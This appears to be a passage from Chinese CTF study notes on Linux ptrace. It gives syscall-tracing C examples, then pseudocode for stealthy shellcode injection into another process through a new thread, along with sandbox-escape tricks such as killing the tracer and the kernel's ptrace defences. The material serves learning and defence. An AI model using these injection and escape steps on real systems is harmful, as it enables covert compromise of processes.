&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着是ptrace的系统调用，通过PTRACE_SYSCALL选项通知tracee进程的所有系统调用的信号给父进程然后再进入循环体。前面我们提到过tracee进程发送的有关系统调用的信号是成对出现的。其中有一个系统调用号1，也就是sys-write值得我们关注。我们可以看到write系统调用是打印出ls的结果的关键。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Origen signal <span class="number">1407</span> !Got signal <span class="number">5</span></span><br><span class="line">Program called system call: <span class="number">1</span></span><br><span class="line">-rwx--x--x  <span class="number">1</span> qwq qwq  17K  <span class="number">7</span>月 <span class="number">18</span> <span class="number">17</span>:<span class="number">27</span> vuln</span><br><span class="line">Origen signal <span class="number">1407</span> !Got signal <span class="number">5</span></span><br><span class="line">Program called system call: <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>我们结合控制台输出来解释下程序当时的行为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Program called system call: <span class="number">1</span>：程序开始调用write系统调用，准备向控制台写入数据；</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root <span class="number">1.9</span>K <span class="number">8</span>月 <span class="number">28</span> <span class="number">17</span>:<span class="number">00</span> monitor_signal.c：程序写入数据；</span><br><span class="line">Program called system call: <span class="number">1</span>：程序退出write系统调用。</span><br></pre></td></tr></table></figure>

<h5 id="1-6-3-4-2-优化代码"><a href="#1-6-3-4-2-优化代码" class="headerlink" title="1.6.3.4.2 优化代码"></a>1.6.3.4.2 优化代码</h5><p>所以我们也可以充分利用PTRACE_SYSCALL的特性，将程序开始进行系统调用和结束系统调用的相关信息打印出来？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/reg.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">	long orig_rax;</span><br><span class="line">	pid_t child=fork();</span><br><span class="line">    <span class="built_in">int</span> status=<span class="number">0</span>;</span><br><span class="line">    long rax=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> insyscall=<span class="number">0</span>;</span><br><span class="line">    long params[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,NULL,NULL);</span><br><span class="line">        execl(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-h&quot;</span>,NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    	wait(&amp;status);</span><br><span class="line">    	ptrace(PTRACE_SYSCALL,child,NULL,NULL);</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status)) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            orig_rax=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*ORIG_RAX,NULL);</span><br><span class="line">            <span class="keyword">if</span>(orig_rax != SYS_write)&#123;</span><br><span class="line">				ptrace(PTRACE_SYSCALL,child,NULL,NULL);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			printf(<span class="string">&quot;Got signal %d\n&quot;</span>,WSTOPSIG(status));</span><br><span class="line">			/*Syscall entry*/</span><br><span class="line">			<span class="keyword">if</span>(insyscall==<span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				insyscall=<span class="number">1</span>;</span><br><span class="line">				params[<span class="number">0</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RDI,NULL);</span><br><span class="line">				params[<span class="number">1</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RSI,NULL);</span><br><span class="line">				params[<span class="number">2</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RDX,NULL);</span><br><span class="line">				printf(<span class="string">&quot;write called with %ld,%ld,%ld\n&quot;</span>,params[<span class="number">0</span>],params[<span class="number">1</span>],params[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				params[<span class="number">0</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RAX,NULL);</span><br><span class="line">				printf(<span class="string">&quot;Write returned with %ld\n&quot;</span>,rax);</span><br><span class="line">				insyscall=<span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, NULL, NULL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相比之前的代码，这份代码有两部分的优化，第一个过滤掉除write的系统调用，第二个显示write系统调用的参数和返回值。</p>
<p>只捕抓write系统调用的实现：过滤掉第一个execve的系统调用之后，再次等待子进程的信号,syscall会向父进程发送信号，可以用PEEKUSER获取的rax值（其作为系统调用号）。</p>
<p>分别处理系统调用的进入和退出：系统调用是成对出现的。因此捕抓到write系统调用的时候，我们通过一个insyscall变量来表示这个系统调用是“进入”状态还是“退出”状态。</p>
<p>显示<code>write</code>系统调用入参情况：我们可以从<code>ORIG_RAX</code>这个寄存器中获取系统调用号，通过同样的方式，我们可以通过<code>RDI</code>、<code>RSI</code>和<code>RDX</code>寄存器分别获取系统调用的第1、2、3个参数。</p>
<p>实际上，Linux为64位机器提供了6个保存参数的寄存器，按照顺序他们分别是：RDI、RSI、RDX、RCX、R8和R9。</p>
<p>显示<code>write</code>系统调用返回值：当<code>insyscall</code>变量为<code>1</code>时，说明程序已经进入系统调用，接下来的一次系统调用行为就是退出系统调用。这时，我们通过获取<code>RAX</code>寄存器中的值，可以获取系统调用的返回值。</p>
<p><code>ORIG_RAX</code>寄存器保存系统调用号，<code>RAX</code>寄存器保存系统调用返回值。</p>
<h5 id="1-6-3-4-3-为什么子进程信号一直是5）SIGTRAP"><a href="#1-6-3-4-3-为什么子进程信号一直是5）SIGTRAP" class="headerlink" title="1.6.3.4.3 为什么子进程信号一直是5）SIGTRAP"></a>1.6.3.4.3 为什么子进程信号一直是5）SIGTRAP</h5><p>在入门版本的输出中，输出的<code>Got signal</code>内容一直都是<code>5</code>这个信号，也就是<code>SIGTRAP</code>。</p>
<p>这个型号只能告诉tracer进程：tracee进程现在处于中止状态，等待tracer进程对其进行控制，而并不能告诉tracer进程到底是什么原因导致tracee进程进入中止状态的。</p>
<p>ptrace系统调用我们提供了判别方式：通过PTRACE_SETOPTIONS操作传递PTRACE_0_TRACESYSGOOD给tracee进程，从而让tracee进程发送给tracer进程的信号编号（signal code）由5也就是SIGTRAP 编程5|0x80，也就是133.</p>
<p>如果返回值是133，那么其就属于系统调用发出的信号。</p>
<p>0x80是操作系统规定属于系统调用的中断号。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/reg.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">	pid_t child=fork();</span><br><span class="line">	long orig_rax=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> status=<span class="number">0</span>;</span><br><span class="line">    long rax=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> insyscall=<span class="number">0</span>;</span><br><span class="line">    long params[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,NULL,NULL);</span><br><span class="line">        execl(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-h&quot;</span>,NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    	wait(&amp;status);</span><br><span class="line">    	ptrace(PTRACE_SETOPTIONS, child, <span class="number">0</span>, PTRACE_O_TRACESYSGOOD);</span><br><span class="line">    	ptrace(PTRACE_SYSCALL,child,NULL,NULL);</span><br><span class="line">    	//puts(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            //puts(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status)) <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (! (WSTOPSIG(status) &amp; <span class="number">0x80</span>)) </span><br><span class="line">            &#123;</span><br><span class="line">				ptrace(PTRACE_SYSCALL, child, NULL, NULL);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		  	&#125;</span><br><span class="line"></span><br><span class="line">            orig_rax=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*ORIG_RAX,NULL);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(orig_rax != <span class="number">1</span>)&#123;</span><br><span class="line">				ptrace(PTRACE_SYSCALL,child,NULL,NULL);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			printf(<span class="string">&quot;Got signal %d\n&quot;</span>,WSTOPSIG(status));</span><br><span class="line">			/*Syscall entry*/</span><br><span class="line">			<span class="keyword">if</span>(insyscall==<span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				insyscall=<span class="number">1</span>;</span><br><span class="line">				params[<span class="number">0</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RDI,NULL);</span><br><span class="line">				params[<span class="number">1</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RSI,NULL);</span><br><span class="line">				params[<span class="number">2</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RDX,NULL);</span><br><span class="line">				printf(<span class="string">&quot;write called with %ld,%ld,%ld\n&quot;</span>,params[<span class="number">0</span>],params[<span class="number">1</span>],params[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				rax=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RAX,NULL);</span><br><span class="line">				printf(<span class="string">&quot;Write returned with %ld\n&quot;</span>,rax);</span><br><span class="line">				insyscall=<span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, NULL, NULL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果，这里只放出一部分代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Got signal <span class="number">133</span></span><br><span class="line">write called <span class="keyword">with</span> <span class="number">1</span>,<span class="number">95611630020928</span>,<span class="number">10</span></span><br><span class="line">total 64K</span><br><span class="line">Got signal <span class="number">133</span></span><br><span class="line">Write returned <span class="keyword">with</span> <span class="number">10</span></span><br><span class="line">Got signal <span class="number">133</span></span><br><span class="line">write called <span class="keyword">with</span> <span class="number">1</span>,<span class="number">95611630020928</span>,<span class="number">46</span></span><br><span class="line">drwxrwxr-x  <span class="number">4</span> qwq qwq <span class="number">4.0</span>K  <span class="number">3</span>月  <span class="number">1</span>  <span class="number">2024</span> buu</span><br><span class="line">Got signal <span class="number">133</span></span><br><span class="line">Write returned <span class="keyword">with</span> <span class="number">46</span></span><br></pre></td></tr></table></figure>



<h2 id="1-7-进程栈与进程堆-线程栈和线程堆"><a href="#1-7-进程栈与进程堆-线程栈和线程堆" class="headerlink" title="1.7 进程栈与进程堆 线程栈和线程堆"></a>1.7 进程栈与进程堆 线程栈和线程堆</h2><p>前面我们提到了进程的四要素</p>
<ol>
<li>要执行的程序</li>
<li>专用的系统堆栈空间（代码段数据段等）</li>
<li>task_struct和pid</li>
<li>独立的存储空间</li>
</ol>
<p>  缺少第四条的称为线程，如果完全没有用户空间称为内核线程，共享用户空间的称为用户线</p>
<p>接下来我们来了解进程栈和线程栈</p>
<hr>
<p><strong>进程栈</strong>：<strong>程序被操作系统加载并执行时，会为其分配一块内存作为进程的地址空间，这其中包括进程栈。</strong>进程栈存储所有线程共享的全局变量之外等等数据。比如局部变量，函数参数和返回地址。每个进程是独立的，所以进程栈也是相互独立的。</p>
<p><strong>线程栈：每个线程共享所属进程的地址空间，但是有自己的线程栈</strong>。线程栈同样存储局部变量，函数参数和返回地址。它们是线程私有的，每个线程的栈空间互不影响。</p>
<p><strong>进程栈服务于整个进程，而线程栈服务于进程内的每一个线程。</strong></p>
<h1 id="0X2-ptrace的shellcode注入"><a href="#0X2-ptrace的shellcode注入" class="headerlink" title="0X2 ptrace的shellcode注入"></a>0X2 ptrace的shellcode注入</h1><h2 id="2-1-相关原理"><a href="#2-1-相关原理" class="headerlink" title="2.1 相关原理"></a>2.1 相关原理</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/350514.html">一种Linux下ptrace隐藏注入shellcode技术和防御方法 - FreeBuf网络安全行业门户</a></p>
<p>不同版本操作系统有各自实现ptrace系统调用的方式，由于本文只关注Linux环境。我们通常用ptrace提供的系统调用 通过一个进程去控制另一个进程，这常被用于程序调试、分析和监测工具，例如gdb和strace等。</p>
<p>控制进程tracer和被控制进程tracee</p>
<p>一个tracee只能关联（attach）一个tracer，一个tracer可以关联多个tracee，实际上linux下tracee只是一个线程，一个包含多个线程的进程中每个线程可以单独关联各自的tracer。</p>
<p>如果tracer要控制tracee可以进行下图的对应操作。</p>
<p><img src="E:\blog_images\1726049231841-1a5c4bdc-96e3-4ed7-9886-a2bdb6dc14b6.jpeg" alt="img"></p>
<ol>
<li>tracer调用PTRACE_ATTACH功能关联指定的tracee，向tracee发送SIGSTOP信号，并调用waitpid等待tracee状态改变；</li>
<li>当tracee状态变成STOP，waitpid返回；</li>
<li>tracer调用PTRACE_SYSCALL功能让tracee进入单步执行状态，并调用waitpid等待tracee状态改变；</li>
<li>重复步骤2)和步骤3)；</li>
<li>tracer调用PTRACE_DETACH功能让tracee恢复运行，并解除关联。</li>
</ol>
<p>步骤3)中tracer可以检查和修改tracee的内存和寄存器内容，给渗透攻击注入shellcode提供了可能，接下来描述利用ptrace隐藏注入shellcode的技术细节。</p>
<h2 id="2-2-技术解析"><a href="#2-2-技术解析" class="headerlink" title="2.2 技术解析"></a>2.2 技术解析</h2><p>达成隐藏注入shellcode的目标需要解决三个问题：</p>
<ol>
<li>shellcode存放在哪里？</li>
<li>如何执行shellcode？</li>
<li>如何不被轻易发现正在运行的shellcode？</li>
</ol>
<h3 id="2-2-1-shellcode存放在哪里"><a href="#2-2-1-shellcode存放在哪里" class="headerlink" title="2.2.1 shellcode存放在哪里"></a>2.2.1 shellcode存放在哪里</h3><p>shellcode存放涉及到读取和写入的问题，而且存放的段还要有可执行权限（即具有rwxp权限的段），所以一般存放在mmap分配出来的内存。</p>
<p>所以要实现shellcode存放，父进程函数执行流得如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_ATTACH,tracee_pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">waitpid(tracee_pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">mem_addr=remote_mmap(tracee_pid,<span class="literal">NULL</span>,<span class="number">4096</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">poke_text(tracee_pid,(<span class="type">size_t</span>)mem_addr,shellcode,SHELL_LEN);</span><br></pre></td></tr></table></figure>

<p>如何在子进程的内存中写入shellcode？自己的猜想</p>
<p>第一 子进程和父进程共享内存，那么我们可以在父进程先写入shellcode</p>
<p>第二 不共享内存，则有没有修改子进程内存的函数或者文件？</p>
<p>文件的话&#x2F;proc&#x2F;pid&#x2F;mem可以修改内存</p>
<h3 id="2-2-2-如何执行shellcode"><a href="#2-2-2-如何执行shellcode" class="headerlink" title="2.2.2 如何执行shellcode"></a>2.2.2 如何执行shellcode</h3><p>我们控制的是父进程的函数执行流，对于子进程我们需要通过父进程修改rip寄存器来达到修改shellcode的效果。伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取tracee寄存器并备份</span></span><br><span class="line"><span class="comment">//reg是struct user_regs_struct类型变量，上面有提到过</span></span><br><span class="line">ptrace(PTRACE_GETREGS,tracee_pid,<span class="literal">NULL</span>,&amp;reg);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;old_regs,&amp;regs,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_regs_struct));</span><br><span class="line"><span class="comment">//修改rip为mem_addr (shellcode的地址)</span></span><br><span class="line">regs.rip = (<span class="type">u_int64_t</span>) mem_addr;</span><br><span class="line">regs.rip += <span class="number">2</span>;<span class="comment">//+=2的意义何在？</span></span><br><span class="line"><span class="comment">//设置tracee寄存器</span></span><br><span class="line">ptrace(PTRACE_SETREGS, tracee_pid, <span class="literal">NULL</span>, &amp;regs)</span><br><span class="line"><span class="comment">//执行shellcode，假设shellcode结尾执行了getpid系统调用，就是用它结尾的意思</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  ptrace(PTRACE_SYSCALL, tracee_pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</span><br><span class="line">  waitpid(tracee_pid, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">  ptrace(PTRACE_GETREGS, tracee_pid, <span class="number">0</span>, &amp;regs)</span><br><span class="line">  <span class="keyword">if</span> (regs.orig_rax == <span class="number">39</span>) &#123;</span><br><span class="line">    <span class="comment">// 已执行getpid系统调用，恢复tracee状态</span></span><br><span class="line">    ptrace(PTRACE_SETREGS, tracee_pid, <span class="literal">NULL</span>, &amp;old_regs)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 恢复tracee运行</span></span><br><span class="line">ptrace(PTRACE_DETACH, tracee_pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>但是上述代码只是在tracee进程（线程）中执行了一次shellcode，还达不到隐藏注入的目的。</p>
<h3 id="2-2-3-隐藏shellcode执行"><a href="#2-2-3-隐藏shellcode执行" class="headerlink" title="2.2.3 隐藏shellcode执行"></a>2.2.3 隐藏shellcode执行</h3><p>一个简单的解决方法是在tracee所在进程中新建一个线程，在新建的线程中执行shellcode，并在shellcode中加入可以持续运行的循环。（如何理解？）</p>
<p>这时，通过监测进程状态难以发现注入的shellcode；如果tracee所在进程原来就包含多个线程，通过监测线程状态也难以准确判断是否被注入了shellcode；虽然检查tracee进程的内存段可以找到具有执行权限的匿名内存段，但是有些进程本来就存在具有执行权限的匿名内存段，仍然不能准确判断是否存在shellcode。综上所述，这种新建线程中执行shellcode的方式能够解决第三个问题：如何不被轻易发现正在运行的shellcode。伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置新建线程的栈</span></span><br><span class="line">stack_addr = remote_mmap(tracee_pid, <span class="literal">NULL</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>)</span><br><span class="line">stack_top = stack_addr + <span class="number">4096</span></span><br><span class="line">poke_text(tracee_pid, (<span class="type">size_t</span>)stack_addr, (<span class="type">char</span> *)&amp;mem_addr, <span class="keyword">sizeof</span>(<span class="type">void</span> *))</span><br><span class="line"><span class="comment">// 修改系统调用为SYS_clone并单步执行，新建线程以后恢复执行原有代码</span></span><br><span class="line">thread_pid = remote_clone(pid, CLONE_PTRACE | CLONE_SIGHAND | CLONE_THREAD | CLONE_VM | CLONE_FS | CLONE_FILES, stack_top)</span><br><span class="line"><span class="comment">// 在新建的线程中执行shellcode</span></span><br><span class="line">ptrace(PTRACE_GETREGS, thread_pid, <span class="literal">NULL</span>, &amp;regs)</span><br><span class="line">regs.rip = (<span class="type">u_int64_t</span>) mem_addr;</span><br><span class="line">ptrace(PTRACE_SETREGS, thread_pid, <span class="literal">NULL</span>, &amp;regs)</span><br><span class="line">ptrace(PTRACE_DETACH, thread_pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<h2 id="2-3-对应的防御措施"><a href="#2-3-对应的防御措施" class="headerlink" title="2.3 对应的防御措施"></a>2.3 对应的防御措施</h2><p>Linux内核使用图4描述的算法检查调用者（caller）相对目标（target）的ptrace访问权限。首先检查调用者和目标是否在同一个线程组，是则允许（allowed）使用ptrace功能；接着根据调用者和目标的用户编号（uid）和组编号（gid）是否一致、目标是否有可转存（dumpable）属性、调用方是否具有CAP_SYS_PTRACE权限，判定是否拒绝（denied）使用ptrace功能；然后调用Linux安全模块（LSM），例如：SELinux、Yama、Smack等，不同的安全模块有各自的检查判定规则；最后如果之前的检查没有拒绝使用ptrace功能，则允许使用。</p>
<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726108227781-e82be599-1ad7-4755-839b-734eb69d8d50.jpeg" alt="img"></p>
<h2 id="2-4-能够进行的绕过"><a href="#2-4-能够进行的绕过" class="headerlink" title="2.4 能够进行的绕过"></a>2.4 能够进行的绕过</h2><p>参考：<a target="_blank" rel="noopener" href="https://qianfei11.github.io/MyOldBlog/2020/04/18/Linux-Sandbox-Ptrace/#Escape-by-Fork">Linux Sandbox - Ptrace - B3ale (qianfei11.github.io)</a></p>
<h3 id="2-4-1-Escape-by-fork"><a href="#2-4-1-Escape-by-fork" class="headerlink" title="2.4.1 Escape by fork"></a>2.4.1 Escape by fork</h3><ul>
<li><p>只要 ptrace 没有跟踪好 fork、vfork、clone，子进程就不会被 ptrace 跟踪；</p>
</li>
<li><p>正确的做法是要继续跟好子进程，或者直接禁止 fork。</p>
</li>
<li><ul>
<li>可以设置 <code>PTRACE_O_TRACECLONE</code> 选项，会自动跟踪 clone 出来的新进程。</li>
</ul>
</li>
</ul>
<h3 id="2-4-2-Escape-by-Kill"><a href="#2-4-2-Escape-by-Kill" class="headerlink" title="2.4.2 Escape by Kill"></a>2.4.2 Escape by Kill</h3><ul>
<li><p>杀死父进程；</p>
</li>
<li><ul>
<li><code>kill(getppid(), 9);</code>；</li>
<li>ppid 无法获取时可以尝试 pid-1；</li>
<li><code>/proc/self/stat</code> 中可以拿到 pid 和 ppid；</li>
<li><code>kill(-1, 9);</code> 杀死除了自己以外的所有进程。</li>
</ul>
</li>
<li><p>设置 <code>PTRACE_O_EXITKILL</code> 可以让 Tracer 结束时把所有的 Tracee 杀死。</p>
</li>
</ul>
<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>fork ptrace wait函数这些进程相关的函数</p>
<p>这里考点比较零碎，主要考基础知识，基础知识得自己去查去学</p>
<p>如fork爆破canary等</p>
<p>wait等的是ptrace的状态，所以我们可以用空的ptrace调用绕过wait的状态检查</p>
<p>例题就是2024nepctf</p>
<h2 id="2024nepctf-NepBOX"><a href="#2024nepctf-NepBOX" class="headerlink" title="2024nepctf NepBOX"></a>2024nepctf NepBOX</h2><p>自制沙盒，好像考点也不难。</p>
<p>主要是看沙盒给了什么函数，从上面的函数下手就可以了。</p>
<p>后面想到wait出来的参数是根据ptrace来的，只要我提前ptrace一个空进程，就能绕过很多东西wait状态的检查，只能说学到了很多进程的东西。</p>
<p>然后虽然说没有read函数的功能，但是题目给出了一个打印read函数参数的功能，就利用这个功能区leak。</p>
<p>要注意rsi为rsp才能leak上面的内容，因为指针的关系，这里%p只是打印寄存器的值，然而pop rsi，自然打印出来rsp上面的值.</p>
